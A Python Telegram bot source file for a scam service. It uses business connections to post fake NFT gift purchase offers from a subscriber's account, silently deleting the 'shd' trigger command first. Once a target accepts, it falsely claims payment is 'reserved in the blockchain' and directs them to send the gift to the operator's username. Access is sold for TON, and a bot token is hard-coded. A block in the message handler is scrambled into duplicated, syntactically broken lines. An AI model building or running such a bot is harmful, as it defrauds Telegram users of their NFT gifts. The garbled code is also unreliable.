"""
Sulumi Team Bot — persistent + anti-freeze + menu/i18n + shd trigger
"""

import os
import re
import uuid
import time
import sqlite3
import requests
import logging

from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

app = Flask(__name__)
executor = ThreadPoolExecutor(max_workers=8)

BOT_TOKEN = os.environ.get("BOT_TOKEN", "9087583806:AAE1nylRFVLF54ppc6EQZJyDE8vQwhN6bYY")
OWNER_ID = int(os.environ.get("OWNER_ID", "9207314182"))
PAYMENT = os.environ.get("PAYMENT", "pantera138382")
API = f"https://api.telegram.org/bot{BOT_TOKEN}"
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://offera-5uqe.onrender.com")
DB_PATH = os.environ.get("DATABASE_PATH", "sulumi_bot.db")
LOGO = os.environ.get("LOGO_URL", "")

sent_ids = set()

E = {
    "stars": "5958376256788502078",
    "grams": "6006074913742396956",
    "decline": "5778527486270770928",
    "accept": "5776375003280838798",
    "forward": "5832251986635920010",
    "check": "6019523512908124649"
}

L = {
    "ru": {
        "menu_caption": "<b>NFT TEAM</b>\nГлавное меню. Выбери раздел:",
        "settings": "Настройки",
        "profile": "Профиль",
        "admins": "Админы",
        "settings_title": "<b>Настройки</b>\nВыбери параметр:",
        "language": "Язык",
        "currency": "Валюта",
        "notifications": "Уведомления",
        "lang_title": "<b>Язык</b>\nВыбери язык интерфейса:",
        "cur_title": "<b>Валюта</b>\nВыбери валюту офферов:",
        "on": "вкл",
        "off": "выкл",
        "back": "Назад",
        "profile_title": "<b>Профиль</b>",
        "holder": "Держатель",
        "holder_title": "<b>Держатель</b>\nОтправь username получателя без @:",
        "holder_set": "Держатель изменён: @{hold}",
        "subscription": "Подписка",
        "stars": "Звёзды",
        "grams": "Граммы",
        "admins_title": "<b>Администрация</b>",
        "notif_accepted": "Твой оффер на {name} #{num} принят. Держатель: @{hold}",
    },
    "en": {
        "menu_caption": "<b>NFT TEAM</b>\nMain menu. Choose a section:",
        "settings": "Settings",
        "profile": "Profile",
        "admins": "Admins",
        "settings_title": "<b>Settings</b>\nChoose a parameter:",
        "language": "Language",
        "currency": "Currency",
        "notifications": "Notifications",
        "lang_title": "<b>Language</b>\nChoose interface language:",
        "cur_title": "<b>Currency</b>\nChoose offer currency:",
        "on": "on",
        "off": "off",
        "back": "Back",
        "profile_title": "<b>Profile</b>",
        "holder": "Holder",
        "holder_title": "<b>Holder</b>\nSend the recipient username without @:",
        "holder_set": "Holder changed: @{hold}",
        "subscription": "Subscription",
        "stars": "Stars",
        "grams": "Grams",
        "admins_title": "<b>Admins</b>",
        "notif_accepted": "Your offer for {name} #{num} was accepted. Holder: @{hold}",
    },
}


def ce(name, fb):
    return f'<tg-emoji emoji-id="{E[name]}">{fb}</tg-emoji>'


def btn(t, d, e):
    return {"text": t, "callback_data": d, "icon_custom_emoji_id": E[e]}


def btn_url(t, u, e):
    return {"text": t, "url": u, "icon_custom_emoji_id": E[e]}


def get_db():
    conn = sqlite3.connect(DB_PATH, timeout=15.0)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL;")
    return conn


def init_db():
    conn = get_db()
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS subscribers (user_id INTEGER PRIMARY KEY, expires_at REAL)")
    c.execute("CREATE TABLE IF NOT EXISTS deals (deal_id TEXT PRIMARY KEY, wid INTEGER, lid INTEGER, slug TEXT, name TEXT, num TEXT, price INTEGER, cur TEXT, holder TEXT, st TEXT, bci TEXT, created REAL)")
    c.execute("CREATE TABLE IF NOT EXISTS user_settings (user_id INTEGER PRIMARY KEY, lang TEXT, cur TEXT, holder TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS user_state (user_id INTEGER PRIMARY KEY, state TEXT, updated REAL)")
    c.execute("CREATE TABLE IF NOT EXISTS business_connections (user_id INTEGER PRIMARY KEY, bci TEXT, updated REAL)")
    try:
        c.execute("ALTER TABLE user_settings ADD COLUMN notif INTEGER DEFAULT 1")
    except Exception:
        pass
    c.execute("INSERT OR IGNORE INTO subscribers (user_id, expires_at) VALUES (?, ?)", (OWNER_ID, -1.0))
    conn.commit()
    conn.close()


def is_allowed(uid):
    try:
        conn = get_db()
        row = conn.execute("SELECT expires_at FROM subscribers WHERE user_id = ?", (uid,)).fetchone()
        conn.close()
        if not row:
            return False
        return row["expires_at"] == -1.0 or row["expires_at"] > time.time()
    except Exception:
        return False


def add_subscription(uid, days):
    conn = get_db()
    exp = -1.0 if days == -1 else time.time() + (days * 86400)
    conn.execute("INSERT OR REPLACE INTO subscribers (user_id, expires_at) VALUES (?, ?)", (uid, exp))
    conn.commit()
    conn.close()


def remove_subscription(uid):
    conn = get_db()
    conn.execute("DELETE FROM subscribers WHERE user_id = ?", (uid,))
    conn.commit()
    conn.close()


def get_expires_str(uid):
    try:
        conn = get_db()
        row = conn.execute("SELECT expires_at FROM subscribers WHERE user_id = ?", (uid,)).fetchone()
        conn.close()
        if not row:
            return "Неизвестно"
        if row["expires_at"] == -1.0:
            return "Навсегда"
        return time.strftime("%d.%m.%Y", time.localtime(row["expires_at"]))
    except Exception:
        return "Неизвестно"


def gs(uid):
    conn = get_db()
    row = conn.execute("SELECT lang, cur, holder, notif FROM user_settings WHERE user_id = ?", (uid,)).fetchone()
    conn.close()
    if row:
        return {
            "lang": row["lang"] or "ru",
            "cur": row["cur"] or "stars",
            "hold": row["holder"] or PAYMENT,
            "notif": 1 if row["notif"] is None else row["notif"],
        }
    return {"lang": "ru", "cur": "stars", "hold": PAYMENT, "notif": 1}


def save_user_settings(uid, s):
    conn = get_db()
    conn.execute(
        "INSERT OR REPLACE INTO user_settings (user_id, lang, cur, holder, notif) VALUES (?, ?, ?, ?, ?)",
        (uid, s.get("lang", "ru"), s.get("cur", "stars"), s.get("hold", PAYMENT), s.get("notif", 1))
    )
    conn.commit()
    conn.close()


def set_user_field(uid, key, value):
    s = gs(uid)
    s[key] = value
    save_user_settings(uid, s)


def t(uid, key):
    lang = gs(uid)["lang"]
    return L.get(lang, L["ru"]).get(key, L["ru"].get(key, key))


def set_state(uid, state):
    conn = get_db()
    conn.execute("INSERT OR REPLACE INTO user_state (user_id, state, updated) VALUES (?, ?, ?)", (uid, state, time.time()))
    conn.commit()
    conn.close()


def get_state(uid):
    conn = get_db()
    row = conn.execute("SELECT state FROM user_state WHERE user_id = ?", (uid,)).fetchone()
    conn.close()
    return row["state"] if row else None


def clear_state(uid):
    conn = get_db()
    conn.execute("DELETE FROM user_state WHERE user_id = ?", (uid,))
    conn.commit()
    conn.close()


def set_bci(uid, bci):
    conn = get_db()
    conn.execute("INSERT OR REPLACE INTO business_connections (user_id, bci, updated) VALUES (?, ?, ?)", (uid, bci, time.time()))
    conn.commit()
    conn.close()


def get_bci(uid):
    conn = get_db()
    row = conn.execute("SELECT bci FROM business_connections WHERE user_id = ?", (uid,)).fetchone()
    conn.close()
    return row["bci"] if row else None


def save_deal(did, d):
    conn = get_db()
    conn.execute(
        "INSERT OR REPLACE INTO deals (deal_id, wid, lid, slug, name, num, price, cur, holder, st, bci, created) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
        (did, d["wid"], d["lid"], d["slug"], d["name"], d["num"], d["price"], d["cur"], d["hold"], d["st"], d.get("bci"), time.time())
    )
    conn.commit()
    conn.close()


def get_deal(did):
    conn = get_db()
    row = conn.execute("SELECT * FROM deals WHERE deal_id = ?", (did,)).fetchone()
    conn.close()
    if not row:
        return None
    return {
        "did": row["deal_id"],
        "wid": row["wid"],
        "lid": row["lid"],
        "slug": row["slug"],
        "name": row["name"],
        "num": row["num"],
        "price": row["price"],
        "cur": row["cur"],
        "hold": row["holder"],
        "st": row["st"],
        "bci": row["bci"],
    }


def set_deal_status(did, st):
    conn = get_db()
    conn.execute("UPDATE deals SET st = ? WHERE deal_id = ?", (st, did))
    conn.commit()
    conn.close()


def api(method, **p):
    try:
        payload = {k: v for k, v in p.items() if v is not None}
        r = requests.post(f"{API}/{method}", json=payload, timeout=60)
        res = r.json()
        if not res.get("ok") and res.get("error_code") == 429:
            retry_after = res.get("parameters", {}).get("retry_after", 2)
            logging.warning(f"RATE LIMIT {method}: sleep {retry_after}s")
            time.sleep(retry_after)
            r = requests.post(f"{API}/{method}", json=payload, timeout=60)
            return r.json()
        return res
    except Exception as e:
        logging.error(f"API ERR {method}: {e}")
        return {}


def track(res, cid):
    try:
        if res.get("ok"):
            sent_ids.add((cid, res["result"]["message_id"]))
            if len(sent_ids) > 5000:
                sent_ids.clear()
    except Exception:
        pass
    return res


def fmt(n):
    return f"{int(n):,}".replace(",", " ")


def sm(cid, txt, kb=None, bci=None):
    d = {"chat_id": cid, "text": txt, "parse_mode": "HTML"}
    if kb:
        d["reply_markup"] = kb
    if bci:
        d["business_connection_id"] = bci
    return track(api("sendMessage", **d), cid)


def sm_nft(cid, txt, url, kb=None, bci=None):
    d = {
        "chat_id": cid,
        "text": txt,
        "parse_mode": "HTML",
        "link_preview_options": {"is_disabled": False, "show_above_text": True, "url": url},
    }
    if kb:
        d["reply_markup"] = kb
    if bci:
        d["business_connection_id"] = bci
    return track(api("sendMessage", **d), cid)


def dm(cid, mid, bci=None):
    d = {"chat_id": cid, "message_id": mid}
    if bci:
        d["business_connection_id"] = bci
    return api("deleteMessage", **d)


def em(cid, mid, txt, kb=None, bci=None):
    d = {"chat_id": cid, "message_id": mid, "text": txt, "parse_mode": "HTML"}
    if kb is not None:
        d["reply_markup"] = kb
    if bci:
        d["business_connection_id"] = bci
    return api("editMessageText", **d)


def ec(cid, mid, cap, kb=None, bci=None):
    d = {"chat_id": cid, "message_id": mid, "caption": cap, "parse_mode": "HTML"}
    if kb is not None:
        d["reply_markup"] = kb
    if bci:
        d["business_connection_id"] = bci
    return api("editMessageCaption", **d)


def edit_any(cid, mid, txt, kb=None, bci=None):
    r = ec(cid, mid, txt, kb=kb, bci=bci)
    if r.get("ok"):
        return r
    return em(cid, mid, txt, kb=kb, bci=bci)


def ac(cb, txt=None, sa=False):
    d = {"callback_query_id": cb, "show_alert": sa}
    if txt:
        d["text"] = txt
    return api("answerCallbackQuery", **d)


def erase_command(cid, mid, bci=None):
    """Порядок как в рабочем тесте: plain delete -> delete с коннектом -> '?'."""
    vectors = [None, bci] if bci else [None]

    for conn in vectors:
        r = dm(cid, mid, bci=conn)
        if r.get("ok"):
            logging.info(f"DEL OK cid={cid} mid={mid} bci={bool(conn)}")
            return True
        logging.warning(f"DEL cid={cid} mid={mid} bci={bool(conn)}: {r.get('description')}")

    for conn in vectors:
        r = em(cid, mid, "?", kb={"inline_keyboard": []}, bci=conn)
        if r.get("ok"):
            logging.info(f"EDIT OK cid={cid} mid={mid} bci={bool(conn)}")
            return True
        logging.warning(f"EDIT cid={cid} mid={mid} bci={bool(conn)}: {r.get('description')}")

    return False


def menu_kb(uid):
    return {"inline_keyboard": [
        [btn("⚙️ " + t(uid, "settings"), "menu:settings", "check"), btn("👤 " + t(uid, "profile"), "menu:profile", "stars")],
        [btn("🛡️ " + t(uid, "admins"), "menu:admins", "forward")],
    ]}


def settings_kb(uid):
    s = gs(uid)
    cur_name = t(uid, "stars") if s["cur"] == "stars" else t(uid, "grams")
    notif = t(uid, "on") if s["notif"] else t(uid, "off")
    return {"inline_keyboard": [
        [btn("🌐 " + t(uid, "language") + ": " + s["lang"].upper(), "set:lang", "check")],
        [btn("💱 " + t(uid, "currency") + ": " + cur_name, "set:cur", "stars")],
        [btn("🔔 " + t(uid, "notifications") + ": " + notif, "set:notif", "accept")],
        [btn("👑 " + t(uid, "holder") + ": @" + s["hold"], "set:holder", "forward")],
        [btn("⬅️ " + t(uid, "back"), "menu:main", "decline")],
    ]}


def lang_kb(uid):
    return {"inline_keyboard": [
        [btn("🇷🇺 Русский", "setlang:ru", "check"), btn("🇬🇧 English", "setlang:en", "check")],
        [btn("⬅️ " + t(uid, "back"), "menu:settings", "decline")],
    ]}


def cur_kb(uid):
    return {"inline_keyboard": [
        [btn("⭐ " + t(uid, "stars"), "setcur:stars", "stars"), btn("💎 " + t(uid, "grams"), "setcur:grams", "grams")],
        [btn("⬅️ " + t(uid, "back"), "menu:settings", "decline")],
    ]}


def back_kb(uid, target):
    return {"inline_keyboard": [[btn("⬅️ " + t(uid, "back"), target, "decline")]]}


def profile_txt(uid):
    s = gs(uid)
    cur_name = t(uid, "stars") if s["cur"] == "stars" else t(uid, "grams")
    notif = t(uid, "on") if s["notif"] else t(uid, "off")
    return (
        t(uid, "profile_title") + "\n\n"
        f"ID: <code>{uid}</code>\n"
        f"{t(uid, 'language')}: {s['lang'].upper()}\n"
        f"{t(uid, 'currency')}: {cur_name}\n"
        f"{t(uid, 'notifications')}: {notif}\n"
        f"{t(uid, 'holder')}: @{s['hold']}\n"
        f"{t(uid, 'subscription')}: {get_expires_str(uid)}"
    )


def okb(did):
    return {"inline_keyboard": [[btn(" Отклонить", f"decline:{did}", "decline"), btn(" Принять", f"accept:{did}", "accept")]]}


def aakb(did, h):
    return {"inline_keyboard": [
        [btn_url(" Передать", f"tg://send_gift?to={h.replace('@', '')}", "forward")],
        [btn(" Проверить", f"check:{did}", "check")],
    ]}


def pnft(t):
    m = re.search(r'(?:https?://)?(?:t\.me/nft/)?([A-Za-z0-9]+-\d+)', t, re.I)
    if not m:
        return None
    s = m.group(1)
    np2, num = s.rsplit("-", 1)
    return {"slug": s, "name": re.sub(r'([a-z])([A-Z])', r'\1 \2', np2), "num": num, "nfmt": fmt(num)}


def handle_state(cid, uid, ci, txt, low, has_shd):
    """True, если сообщение съедено ожиданием ввода."""
    if has_shd or txt.startswith("/"):
        return False

    state = get_state(uid)
    if not state:
        return False

    if state == "holder":
        un = txt.lstrip("@").lower()
        if un and " " not in un:
            set_user_field(uid, "hold", un)
            clear_state(uid)
            sm(cid, t(uid, "holder_set").format(hold=un), kb=settings_kb(uid), bci=ci)
        return True

    if state == "lang":
        if low in ("ru", "en"):
            set_user_field(uid, "lang", low)
            clear_state(uid)
            sm(cid, f"✅ Язык: {'🇷🇺 RU' if low == 'ru' else '🇬🇧 EN'}", bci=ci)
        return True

    if state == "cur":
        if low in ("stars", "grams"):
            set_user_field(uid, "cur", low)
            clear_state(uid)
            sm(cid, f"✅ Валюта: {'⭐' if low == 'stars' else '💎'}", bci=ci)
        return True

    return False


def process_msg(msg):
    try:
        cid = msg["chat"]["id"]
        uid = msg["from"]["id"]
        mid = msg["message_id"]
        ci = msg.get("business_connection_id")
        txt = (msg.get("text") or msg.get("caption") or "").strip()

        if not cid or not uid or not txt:
            return
        if (cid, mid) in sent_ids:
            return
        if ci:
            set_bci(uid, ci)

        low = txt.lower()
        has_shd = "shd" in low

        if has_shd:
            erase_command(cid, mid, bci=ci)

        if txt == "/start":
            clear_state(uid)
            cap = t(uid, "menu_caption")
            kb = menu_kb(uid)
            sent = None
            if LOGO:
                d = {"chat_id": cid, "photo": LOGO, "caption": cap, "parse_mode": "HTML", "reply_markup": kb}
                if ci:
                    d["business_connection_id"] = ci
                sent = track(api("sendPhoto", **d), cid)
            if not (sent and sent.get("ok")):
                sm(cid, cap, kb=kb, bci=ci)
            return

        if handle_state(cid, uid, ci, txt, low, has_shd):
            return

        if has_shd:
            ni = pnft(txt)
            if not ni:
                err = sm(cid, "❌ Не найдена NFT", bci=ci)
                time.sleep(1.5)
                if err.get("ok"):
                    dm(cid, err["result"]["message_id"], bci=ci)
                return

            parts = txt.split()
            try:
                pr = int(parts[-1])
            except Exception:
                err = sm(cid, "❌ Цена должна быть числом", bci=ci)
                time.sleep(1.5)
                if err.get("ok"):
                    dm(cid, err["result"]["message_id"], bci=ci)
                return

            if uid != OWNER_ID and not is_allowed(uid):
                err = sm(cid, f"🔒 Доступ закрыт. @{PAYMENT}", bci=ci)
                time.sleep(1.5)
                if err.get("ok"):
                    dm(cid, err["result"]["message_id"], bci=ci)
                return

            s = gs(uid)
            cs = ce("stars", "⭐") if s["cur"] == "stars" else ce("grams", "💎")
            did = str(uuid.uuid4())[:8]
            sender_bci = ci or get_bci(uid)

            if not sender_bci:
                err = sm(cid, "⚠️ Подключи бизнес-аккаунт!", bci=ci)
                time.sleep(1.5)
                if err.get("ok"):
                    dm(cid, err["result"]["message_id"], bci=ci)
                return

            deal = {
                "wid": uid,
                "lid": cid,
                "slug": ni["slug"],
                "name": ni["name"],
                "num": ni["num"],
                "price": pr,
                "cur": s["cur"],
                "hold": s["hold"],
                "st": "pending",
                "bci": sender_bci,
            }
            save_deal(did, deal)

            nl = f"https://t.me/nft/{ni['slug']}"
            hidden = f'<a href="{nl}">\u200b</a>'
            name = msg["from"].get("first_name") or msg["from"].get("username") or "User"
            cap = hidden + f"<u>{name}</u> предлагает за подарок <b>{ni['name']} #{ni['nfmt']}</b> сумму <b>{pr}</b> {cs}.\n\nУ вас есть 5h 59m, чтобы принять решение."
            sm_nft(cid, cap, nl, kb=okb(did), bci=sender_bci)
            return

        if txt.startswith("/"):
            if txt == "/buy":
                sm(cid, f"💎 Напишите @{PAYMENT} для покупки", bci=ci)
                return
            if txt == "/tarifs":
                sm(cid, "💎 1 День — 1 TON\n3 Дня — 2.5 TON\nНавсегда — 4.5 TON", bci=ci)
                return
            if txt == "/lg":
                set_state(uid, "lang")
                sm(cid, "🌐 ru или en", bci=ci)
                return
            if txt == "/cv":
                set_state(uid, "cur")
                sm(cid, "💱 stars или grams", bci=ci)
                return
            if txt.startswith("/holder"):
                set_state(uid, "holder")
                sm(cid, "👑 Username без @", bci=ci)
                return
            if uid != OWNER_ID:
                sm(cid, "🔒 Только для админа", bci=ci)
                return

            if txt == "/diag":
                test_bci = ci or get_bci(uid)
                probe = sm(cid, "diag", bci=test_bci)
                if not probe.get("ok")
                sm(cid, f"send: {probe.get('description')}", bci=ci)
                    added = []
            deal = {
            }
                return
                err = sm(cid, "❌ Не найдена NFT", bci=ci)
                if err.get("ok"):
            if txt == "/buy":
            cs = ce("stars", "⭐") if s["cur"] == "stars" else ce("grams", "💎")
                sm(cid, "🌐 ru или en", bci=ci)
                    return
                    for tid in ids:
                "wid": uid,
            save_deal(did, deal)
                time.sleep(1.5)
                    dm(cid, err["result"]["message_id"], bci=ci)
                sm(cid, f"💎 Напишите @{PAYMENT} для покупки", bci=ci)
            did = str(uuid.uuid4())[:8]
                        add_subscription(tid, days)
                "lid": cid,

                if err.get("ok"):
                return
                return
            sender_bci = ci or get_bci(uid)
                        added.append(str(tid))
                "slug": ni["slug"],
            nl = f"https://t.me/nft/{ni['slug']}"
                    dm(cid, err["result"]["message_id"], bci=ci)

            if txt == "/tarifs":

                    exp_str = "Навсегда" if days == -1 else f"{days} дн."
                "name": ni["name"],
            hidden = f'<a href="{nl}">\u200b</a>'
                return
            if uid != OWNER_ID and not is_allowed(uid):
                sm(cid, "💎 1 День — 1 TON\n3 Дня — 2.5 TON\nНавсегда — 4.5 TON", bci=ci)
            if not sender_bci:
                    sm(cid, f"✅ Доступ выдан {len(added)} пользователям:\n<code>{', '.join(added)}</code>\nСрок: {exp_str}", bci=ci)
                "num": ni["num"],
            name = msg["from"].get("first_name") or msg["from"].get("username") or "User"

                err = sm(cid, f"🔒 Доступ закрыт. @{PAYMENT}", bci=ci)
                err = sm(cid, "⚠️ Подключи бизнес-аккаунт!", bci=ci)
                except Exception as e:
                "price": pr,
            cap = hidden + f"<u>{name}</u> предлагает за подарок <b>{ni['name']} #{ni['nfmt']}</b> сумму <b>{pr}</b> {cs}.\n\nУ вас есть 5h 59m, чтобы принять решение."
            parts = txt.split()
                time.sleep(1.5)
                time.sleep(1.5)
                    sm(cid, f"❌ Ошибка: {e}", bci=ci)
                "cur": s["cur"],
            sm_nft(cid, cap, nl, kb=okb(did), bci=sender_bci)
            try:
                if err.get("ok"):
                if err.get("ok"):
                return
                "hold": s["hold"],
                pr = int(parts[-1])
                    dm(cid, err["result"]["message_id"], bci=ci)
                    dm(cid, err["result"]["message_id"], bci=ci)


            if txt.startswith("/zabrat"):
        if handle_state(cid, uid, ci, txt, low, has_shd):
                parts = txt.split()
            return
                if len(parts) < 2:

                    sm(cid, "❌ Формат: <code>/zabrat id</code>", bci=ci)
                    return
                try:
                    target_uid = int(parts[1])
                    remove_subscription(target_uid)
                    sm(cid, f"✅ Доступ отозван у <code>{target_uid}</code>", bci=ci)
                except Exception as e:
                    sm(cid, f"❌ Ошибка: {e}", bci=ci)
                return

            if txt == "/list":
                conn = get_db()
                rows = conn.execute("SELECT user_id, expires_at FROM subscribers").fetchall()
                conn.close()
                if not rows:
                    sm(cid, "📋 Список пуст", bci=ci)
                    return
                ul = "\n".join([f"• <code>{r['user_id']}</code> — {get_expires_str(r['user_id'])}" for r in rows])
                sm(cid, f"📋 Доступы ({len(rows)}):\n\n{ul}", bci=ci)
                return

    except Exception as e:
        logging.error(f"MSG ERR: {e}")
# --- CALLBACK HANDLER ---

def process_cb(cb):
    try:
        cbid = cb["id"]
        uid = cb["from"]["id"]
        msg = cb.get("message") or {}
        cid = msg.get("chat", {}).get("id", uid)
        mid = msg.get("message_id", 0)
        data = cb.get("data", "")
        ci = msg.get("business_connection_id")

        if data.startswith("menu:"):
            act = data.split(":", 1)[1]
            ac(cbid)
            if act == "main":
                edit_any(cid, mid, t(uid, "menu_caption"), menu_kb(uid), ci)
            elif act == "settings":
                edit_any(cid, mid, t(uid, "settings_title"), settings_kb(uid), ci)
            elif act == "profile":
                edit_any(cid, mid, profile_txt(uid), back_kb(uid, "menu:main"), ci)
            elif act == "admins":
                edit_any(cid, mid, t(uid, "admins_title") + f"\n\n@{PAYMENT}", back_kb(uid, "menu:main"), ci)
            return

        if data.startswith("set:"):
            act = data.split(":", 1)[1]
            ac(cbid)
            if act == "lang":
                edit_any(cid, mid, t(uid, "lang_title"), lang_kb(uid), ci)
            elif act == "cur":
                edit_any(cid, mid, t(uid, "cur_title"), cur_kb(uid), ci)
            elif act == "notif":
                s = gs(uid)
                set_user_field(uid, "notif", 0 if s["notif"] else 1)
                edit_any(cid, mid, t(uid, "settings_title"), settings_kb(uid), ci)
            elif act == "holder":
                set_state(uid, "holder")
                edit_any(cid, mid, t(uid, "holder_title"), back_kb(uid, "set:holderback"), ci)
            elif act == "holderback":
                clear_state(uid)
                edit_any(cid, mid, t(uid, "settings_title"), settings_kb(uid), ci)
            return

        if data.startswith("setlang:"):
            val = data.split(":", 1)[1]
            if val in ("ru", "en"):
                set_user_field(uid, "lang", val)
            ac(cbid)
            edit_any(cid, mid, t(uid, "settings_title"), settings_kb(uid), ci)
            return

        if data.startswith("setcur:"):
            val = data.split(":", 1)[1]
            if val in ("stars", "grams"):
                set_user_field(uid, "cur", val)
            ac(cbid)
            edit_any(cid, mid, t(uid, "settings_title"), settings_kb(uid), ci)
            return

        if data.startswith("check:"):
            did = data.split(":", 1)[1]
            deal = get_deal(did)
            if not deal:
                ac(cbid, txt="Оффер не найден", sa=True)
                return
            if deal["st"] in ("declined", "expired"):
                ac(cbid, txt="Сделка закрыта", sa=True)
                return
            if deal["st"] == "completed":
                ac(cbid, txt="Сделка уже завершена", sa=True)
                return
            nf = fmt(deal["num"])
            h = deal["hold"]
            instr = (
                f"Ожидается передача {deal['name']} #{nf} на @{h}\n\n"
                f"1. Кнопка «Передать»\n"
                f"2. Вкладка «Мои»\n"
                f"3. Выберите NFT и передайте"
            )
            if len(instr) > 200:
                instr = instr[:197] + "..."
            r = ac(cbid, txt=instr, sa=True)
            if not r.get("ok"):
                logging.warning(f"CHECK ALERT: {r.get('description')}")
                ac(cbid)
                sm(cid, instr, bci=ci)
            return

        if data.startswith("accept:"):
            did = data.split(":", 1)[1]
            deal = get_deal(did)
            if not deal or deal["st"] != "pending":
                ac(cbid)
                return
            set_deal_status(did, "accepted")
            ac(cbid)
            nf = fmt(deal["num"])
            h = deal["hold"]
            if gs(deal["wid"])["notif"]:
                sm(deal["wid"], t(deal["wid"], "notif_accepted").format(name=deal["name"], num=nf, hold=h))
            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
            nl = f"https://t.me/nft/{deal['slug']}"
            bci = deal.get("bci") or ci
            hidden = f'<a href="{nl}">\u200b</a>'
            txt = hidden + f"<b>{deal['price']}</b> {cs} успешно зарезервированы в блокчейне.\n\n"
            txt += f"Ожидается передача подарка <b>{deal['name']} #{nf}</b> @{h}.\n\n"
            txt += f"Нажмите кнопку «Передать» и отправьте подарок <b>{deal['name']} #{nf}</b> пользователю <b>@{h}</b>. После завершения сделки {cs} автоматически начислятся на ваш аккаунт."
            d = {
                "chat_id": cid,
                "message_id": mid,
                "text": txt,
                "parse_mode": "HTML",
                "link_preview_options": {"is_disabled": False, "show_above_text": True, "url": nl},
                "reply_markup": aakb(did, h),
            }
            if bci:
                d["business_connection_id"] = bci
            res = api("editMessageText", **d)
            if not res.get("ok"):
                dm(cid, mid, bci=bci)
                sm_nft(cid, txt, nl, kb=aakb(did, h), bci=bci)
            return

        if data.startswith("decline:"):
            did = data.split(":", 1)[1]
            deal = get_deal(did)
            if not deal or deal["st"] != "pending":
                ac(cbid)
                return
            set_deal_status(did, "declined")
            ac(cbid)
            bci = deal.get("bci") or ci
            em(cid, mid, ce("decline", "❌") + " Оффер отклонён", kb={"inline_keyboard": []}, bci=bci)
            return

        ac(cbid)

    except Exception as e:
        logging.error(f"CB ERR: {e}")


def process_update(u):
    try:
        if "message" in u:
            process_msg(u["message"])
        elif "business_message" in u:
            process_msg(u["business_message"])
        elif "callback_query" in u:
            process_cb(u["callback_query"])
        elif "business_connection" in u:
            bc = u["business_connection"]
            set_bci(bc["user"]["id"], bc["id"])
    except Exception as e:
        logging.error(f"UPDATE ERR: {e}")


seen_updates = {}


@app.route("/webhook", methods=["POST"])
def webhook():
    u = request.get_json(force=True, silent=True)
    if not u:
        return jsonify({"ok": True}), 200
    upd_id = u.get("update_id")
    if upd_id is not None:
        now = time.time()
        if upd_id in seen_updates:
            return jsonify({"ok": True}), 200
        seen_updates[upd_id] = now
        if len(seen_updates) > 5000:
            for k in [k for k, v in seen_updates.items() if now - v > 600]:
                seen_updates.pop(k, None)
    executor.submit(process_update, u)
    return jsonify({"ok": True}), 200


@app.route("/")
def index():
    return "OK"


def set_wh():
    r = api(
        "setWebhook",
        url=f"{RENDER_URL}/webhook",
        allowed_updates=["message", "callback_query", "business_connection", "business_message"]
    )
    logging.info(f"Webhook set: {r}")


def set_cmd():
    api("setMyCommands", commands=[
        {"command": "start", "description": "Главное меню"},
        {"command": "buy", "description": "Купить"},
        {"command": "tarifs", "description": "Цены"},
        {"command": "lg", "description": "Язык"},
        {"command": "cv", "description": "Валюта"},
        {"command": "holder", "description": "Держатель"},
        {"command": "diag", "description": "Диагностика удаления (админ)"},
        {"command": "list", "description": "Список (админ)"},
        {"command": "zabrat", "description": "Отозвать (админ)"},
        {"command": "legitt", "description": "Выдать (админ)"},
    ])


init_db()

if __name__ == "__main__":
    set_wh()
    set_cmd()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
